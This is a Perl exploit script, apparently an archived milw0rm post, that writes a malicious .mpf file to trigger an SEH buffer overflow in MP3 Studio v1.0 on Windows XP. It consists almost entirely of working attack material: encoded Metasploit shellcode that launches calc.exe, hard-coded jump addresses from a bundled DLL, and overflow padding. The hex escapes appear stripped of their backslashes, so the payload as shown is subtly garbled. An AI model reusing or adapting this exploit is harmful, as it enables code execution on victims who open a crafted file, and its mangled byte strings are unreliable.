#!/usr/bin/perl
#
# MP3 Studio v1.0 (mpf File) Local BOF Exploit (SEH)
# Exploited by: Koshi
# Download: http://www.software112.com/products/mp3-millennium+download.html
# Based on PoC/findings by HACK4LOVE ( http://milw0rm.com/exploits/9277 )
# Tested on WinXP SP3
#
# I've used addresses from "xuadio.dll", which is shipped with the package.
#
 
# win32_exec -  EXITFUNC=process CMD=calc.exe Size=338 Encoder=Alpha2 http://metasploit.com
my $shellcode =
"xebx03x59xebx05xe8xf8xffxffxffx49x49x49x49x49x49".
"x49x49x49x49x48x49x49x49x49x49x49x49x51x5ax6ax66".
"x58x50x30x42x31x41x42x6bx42x41x76x42x32x42x41x32".
"x41x41x30x41x41x58x50x38x42x42x75x49x79x4bx4cx4d".
"x38x43x74x67x70x63x30x67x70x4cx4bx41x55x37x4cx6c".
"x4bx41x6cx73x35x53x48x64x41x4ax4fx6cx4bx70x4fx67".
"x68x6cx4bx41x4fx57x50x45x51x5ax4bx53x79x4ex6bx74".
"x74x6cx4bx76x61x38x6ex64x71x59x50x6ex79x4ex4cx6b".
"x34x79x50x63x44x73x37x4ax61x69x5ax44x4dx76x61x6b".
"x72x7ax4bx4bx44x35x6bx50x54x77x54x65x54x71x65x4d".
"x35x6ex6bx61x4fx64x64x65x51x7ax4bx63x56x4cx4bx56".
"x6cx50x4bx4ex6bx43x6fx47x6cx65x51x6ax4bx6cx4bx55".
"x4cx6cx4bx64x41x68x6bx6dx59x63x6cx45x74x75x54x59".
"x53x36x51x4bx70x71x74x6ex6bx67x30x30x30x6fx75x6b".
"x70x30x78x64x4cx4cx4bx37x30x44x4cx6ex6bx54x30x47".
"x6cx6ex4dx6ex6bx53x58x75x58x6ax4bx76x69x4ex6bx6b".
"x30x6cx70x37x70x47x70x35x50x4cx4bx50x68x57x4cx51".
"x4fx35x61x6cx36x63x50x52x76x4fx79x6cx38x6bx33x6f".
"x30x31x6bx36x30x33x58x73x4ex69x48x6bx52x44x33x55".
"x38x6dx48x4bx4ex4dx5ax74x4ex50x57x4bx4fx48x67x71".
"x73x62x41x32x4cx45x33x56x4ex55x35x61x68x31x75x75".
"x50x66";
 
my $jmpe = "x3fx5ex03x10";          # 0x10035E3F jmp esp (xaudio.dll)
my $nseh = "xebxf1x90x90";          # Get back to where we once belong.
my $eseh = "xfdx61x03x10";          # 0x100361FD jmp edi (xaudio.dll)
my $phun = "x33xc0x33x45xf8x04x05xffxe0";
#
#   XOR EAX,EAX
#   XOR EAX,DWORD PTR SS:[EBP-8]
#   ADD AL,5
#   JMP EAX
#
my $leng = 4103 - length($shellcode) - length($phun);
my $buff = "x41"x$leng;
my $tuff = "http:".$buff.$shellcode.$phun.$jmpe.$nseh.$eseh;
 
open (MYFILE, '>>exploit.mpf');
print MYFILE "$tuff";
close (MYFILE);
print "Exploit file has been created. ( exploit.mpf )n";
 
# milw0rm.com [2009-07-28]